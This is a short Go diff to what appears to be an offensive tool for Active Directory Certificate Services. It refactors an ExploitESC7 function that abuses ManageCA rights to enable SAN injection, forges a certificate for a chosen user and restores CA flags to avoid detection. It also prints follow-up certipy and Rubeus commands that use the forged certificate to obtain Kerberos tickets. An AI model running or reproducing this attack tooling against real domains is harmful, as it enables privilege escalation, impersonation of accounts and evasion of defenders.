@@ -1,7 +1,7 @@
 package pki
 
 import (
-	"crypto/ecdsa"
+	"crypto"
 	"crypto/x509"
 	"fmt"
 	"strings"
@@ -149,7 +149,7 @@ func checkESC7(caName, caDN string, rawSD []byte) ([]ESC7Finding, error) {
 //  2. Save original flags, then enable EDITF_ATTRIBUTESUBJECTALTNAME2
 //  3. Exploit as ESC6 — request a certificate with the target UPN in the SAN
 //  4. Restore the original CA flags to reduce detection footprint
-func ExploitESC7(cfg *ADCSConfig, caName, targetUPN string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
+func ExploitESC7(cfg *ADCSConfig, caName, targetUPN string) (*x509.Certificate, crypto.Signer, error) {
 	fmt.Printf("[!] ESC7 Exploitation: ca=%s target=%s\n", caName, targetUPN)
 
 	// Step 1: Verify the CA is ESC7-exploitable
@@ -259,7 +259,7 @@ func ExploitESC7(cfg *ADCSConfig, caName, targetUPN string) (*x509.Certificate, 
 	}
 	fmt.Printf("[+] ESC7 exploitation successful — ManageCA -> ESC6 -> forged cert\n")
 	fmt.Printf("[*] Next steps:\n")
-	fmt.Printf("    certipy auth -pfx %s.pfx -dc-ip %s\n", upnUser, cfg.TargetDC)
+	fmt.Printf("    certipy-ad auth -pfx %s.pfx -dc-ip <DC_IP> -domain %s\n", upnUser, cfg.Domain)
 	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s.pfx /ptt\n", targetUPN, upnUser)
 	fmt.Printf("    # Certificate obtained via ESC7 (ManageCA abuse) on CA: %s\n", caName)
 	return cert, certKey, nil
